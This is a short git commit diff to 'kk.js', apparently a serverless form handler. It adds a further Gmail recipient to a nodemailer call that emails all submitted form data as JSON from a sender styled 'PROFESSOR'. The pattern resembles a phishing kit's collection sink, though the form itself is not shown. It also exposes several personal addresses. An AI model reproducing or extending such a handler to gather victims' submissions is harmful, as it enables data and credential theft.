b0e1fad7910a006f244de25826a36477b31e1cea
zm9807350 <zm9807350@gmail.com>
2026-01-28 10:22:55 +0500

    Update kk.js

--- kk.js
+++ kk.js
@@ -37,7 +37,7 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,submitdispute@gmail.com,nizamaniaqsa41@gmail.com",
+      to: "linkquarry@gmail.com,submitdispute@gmail.com,nizamaniaqsa41@gmail.com,newzatpage@gmail.com",
       subject: "kk",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
